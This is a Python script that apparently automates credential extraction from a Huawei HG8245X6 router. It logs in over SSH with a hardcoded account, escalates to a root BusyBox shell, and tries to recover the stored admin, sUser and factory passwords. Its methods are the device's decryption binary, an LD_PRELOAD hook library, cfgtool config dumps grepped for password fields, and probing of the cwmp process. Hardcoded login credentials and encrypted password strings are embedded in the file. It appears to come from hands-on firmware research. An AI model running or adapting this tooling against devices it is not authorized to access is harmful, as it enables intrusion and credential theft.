#!/usr/bin/env python3
"""
Router password decryption - final version.
Uses /bin/decrypt_boardinfo and proper LD_PRELOAD on busybox.
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"
HTTP_SERVER = "http://192.168.1.20:8080"

# XML-decoded passwords from hw_ctree.xml
ADMIN_PWD    = r'$2e-%/VNb~@!iMi_Q\e*<X~<)LV7QkLJ>sVOE$:(0)\U[2.7Ly9Fr/ZQLg-' + "'g4sc>F.f5`D4][r{R'L}~<E5!QJ)MdjLpIt|\"MF+E&$"
SUSER_PWD    = "$2c'7c'V@!eT/f~v4witR>@PZf3yk4YO^\"rC&mpD\"%k" + r'\#CZS![J.{4=*0]Fj;MIEK}P\aS!WILt5=7/&yXd=vdEoclQ*B%Tn%tkO\:$'
FACTORY_PWD  = "$2;b!L'n2xsK4$!g7z::%X{g#WMF|uCUvs$~0" + r'\P5h$$'

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_and_read(chan, cmd, marker="# ", timeout=15, print_output=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, marker, timeout)
    if print_output:
        # Extract just the response (after the echo of our command)
        lines = out.strip().split('\n')
        response = '\n'.join(l for l in lines if cmd[:20] not in l and l.strip())
        if response:
            print(response)
    return out

def connect_and_shell():
    """Connect to router and get a BusyBox shell. Returns (client, chan)."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=200, height=50)
    time.sleep(2)
    
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    return client, chan

def main():
    print("=" * 60)
    print("Huawei HG8245X6 Password Decryption")
    print("=" * 60)
    
    client, chan = connect_and_shell()
    print("[+] Shell obtained!\n")
    
    # 1. Explore /bin/decrypt_boardinfo
    print("[*] === Testing /bin/decrypt_boardinfo ===")
    send_and_read(chan, "/bin/decrypt_boardinfo --help 2>&1 | head -5")
    send_and_read(chan, "/bin/decrypt_boardinfo 2>&1 | head -10")
    
    # 2. Check what decrypt_boardinfo does with input
    print("\n[*] === Testing decrypt_boardinfo with admin password ===")
    # First write the password to a temp file
    send_and_read(chan, "printf '%s' '$2;b!Ln2xsK4$!g7z::%%X{g#WMF|uCUvs$~0\\\\P5h$$' > /tmp/test_pwd.txt", timeout=5)
    send_and_read(chan, "/bin/decrypt_boardinfo /tmp/test_pwd.txt 2>&1")
    
    # 3. Check the /var/decrypt_boardinfo files
    print("\n[*] === Checking /var/decrypt_boardinfo ===")
    send_and_read(chan, "cat /var/decrypt_boardinfo 2>&1 | head -20")
    send_and_read(chan, "cat /var/decrypt_boardinfo.bak 2>&1 | head -20")
    send_and_read(chan, "strings /var/decrypt_boardinfo 2>&1 | head -30")
    
    # 4. Find and read the live deftree with actual cleartext passwords
    print("\n[*] === Reading live deftree (may contain cleartext) ===")
    send_and_read(chan, "cfgtool get deftree X_HW_WebUserInfo 2>&1")
    
    # 5. Try cfgtool gettofile to dump the config
    print("\n[*] === Dumping config to file ===")
    send_and_read(chan, "cfgtool gettofile deftree InternetGatewayDevice /tmp/dump.xml 2>&1")
    send_and_read(chan, "grep -i 'password\\|passwd\\|X_HW_Web' /tmp/dump.xml 2>&1 | head -20")
    
    # 6. Use LD_PRELOAD with a simpler target binary
    print("\n[*] === LD_PRELOAD into simple binary ===")
    send_and_read(chan, "LD_PRELOAD=/tmp/hook_decrypt.so /bin/sh -c 'echo test' 2>&1", timeout=20)
    
    # 7. Try directly with echo
    print("\n[*] === LD_PRELOAD into echo ===")
    send_and_read(chan, "LD_PRELOAD=/tmp/hook_decrypt.so echo TRIGGERED 2>&1", timeout=20)
    
    # 8. Check if LD_PRELOAD works at all (test with busybox)
    print("\n[*] === LD_PRELOAD test with ls ===")
    send_and_read(chan, "LD_PRELOAD=/tmp/hook_decrypt.so ls /tmp 2>&1 | head", timeout=20)
    
    # 9. Check memory of cwmp process (it uses password decryption for TR-069)
    print("\n[*] === cwmp process memory for passwords ===")
    send_and_read(chan, "ls /proc/$(ps | grep cwmp | grep -v grep | awk '{print $1}' | head -1)/fd/ 2>&1 | head")
    
    # 10. Check if there's a cfgclient or similar tool
    print("\n[*] === Finding config tools ===")
    send_and_read(chan, "ls /bin/cfg* /usr/bin/cfg* 2>&1")
    send_and_read(chan, "ls /bin/hw_* /usr/bin/hw_* 2>&1 | head -20")
    
    client.close()
    print("\n[*] Done.")

if __name__ == "__main__":
    main()
